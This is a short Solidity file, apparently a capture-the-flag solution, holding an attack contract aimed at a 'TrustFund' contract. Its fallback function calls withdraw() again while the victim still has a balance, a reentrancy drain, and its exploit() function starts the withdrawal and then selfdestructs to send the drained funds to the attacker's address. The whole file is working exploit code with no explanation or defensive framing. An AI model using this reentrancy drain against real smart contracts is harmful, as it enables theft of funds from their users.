pragma solidity 0.4.24;

import "./TrustFund.sol";

contract trustfundattack
{
    address public owner;
    address public victim_addr;
    
    constructor(address addr)
    {
        //Remember our wallet address
        owner=msg.sender;
        //Rememberthe victim contract
        victim_addr = addr;
    }
    
    function () payable 
    {
        if(address(victim_addr).balance > 0)
            TrustFund(victim_addr).withdraw();
    } //Ensure we can get paid (very important)
    
    function exploit() external payable
    {
        //Remember to authorize this exploit contract with the CtfFramework before running this exploit
        
        TrustFund(victim_addr).withdraw();
        
        //Send ourselves the profits
        selfdestruct(owner);
    }
}

